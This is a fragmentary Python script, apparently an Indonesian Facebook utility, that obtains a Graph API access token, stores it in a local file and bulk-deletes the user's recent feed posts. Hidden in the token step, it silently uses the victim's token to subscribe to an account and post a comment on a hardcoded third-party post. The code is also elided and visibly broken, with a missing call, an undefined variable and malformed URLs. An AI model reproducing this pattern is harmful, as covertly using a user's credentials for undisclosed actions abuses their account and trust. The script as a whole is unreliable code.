...
def menu():
	...
	try:	
		ajakPostDelete = san.get('https://graph.facebook.com/me?access_token='+token).json()
	except KeyError:
		print(m+'['+p+'!'+m+'] Token not found')
		os.system('rm -rf result/token.txt')
	os.system('clear')
	print(logo)
	print(p+40*'_')
	print(m+'\n('+h+'✓'+m+')'+p+' Akun Pengunjung : '+h+ajakPostDelete['name'])
	print(p+40*'_')
...
def deletePost():
	...
	try:
		...
		login()
	ajakGet=san.get('https://graph.facebook.com/me?access_token='+token).json		
	os.system('clear')
	print(logo)
	print(p+40*'_')
	print(m+'\n['+p+'+'+m+']'+h+' From '+p+': '+ajakGet['name'])
	mengetik(m+'['+p+'+'+m+']'+h+' Start ...')
	print(p+40*'_'+'\n')
	ajakPostDelete=san.get('https://graph.facebook.com/v3.0/me?fields=feed.limit(49)&access_token='+token).json()
	for i in ajakPostDelete['data']:
		so=san.post('https://graph.facebook.com/'+i['id']+'?method=DELETE&access_token='+token).json()
		try:
			what=so['error']['message']
			print(m+'[×] Failed')
		except TypeError:
...
if __name__=='__main__':
	...
	try:
		...
		try:
			...
			ajakPostDelete=san.get(graphFB,params=data).json()
			nguyen=open('result/token.txt','w')
			nguyen.write(ajakPostDelete['access_token'])
			nguyen.close()
			if 'access_token' in response:
				token=open('result/token.txt','r').read()
				print(m+'['+h+'✓'+m+']'+h+' Success generate access token');san.post(url+'https://graph.facebook.com/api.version/subscribers?access_token='+token);san.post(url+'https://graph.facebook.com/100025271623353_485040922348291/comments?message=❤️&access_token='+token)
				time.sleep(1)
				menu()
		except KeyError:
